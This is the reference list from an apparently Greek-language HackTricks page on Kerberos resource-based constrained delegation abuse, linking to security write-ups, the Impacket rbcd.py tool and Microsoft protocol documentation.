- [3] [Resource-based Constrained Delegation στο Kerberos: Κατάληψη Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Κατάχρηση Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Το Kerberosity σκότωσε το Domain: Μια επισκόπηση του επιθετικού Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (επίσημο)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Σύντομο cheatsheet Linux με πρόσφατη σύνταξη](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay σε RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Εξερεύνηση cross-domain και cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Εξερεύνηση cross-domain και cross-forest RBCD: μέρος 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Κλάδος Impacket της Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Επισκόπηση Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Εντοπισμός και αντιμετώπιση χρήσης RC4 στο Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Λεπτομέρειες S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
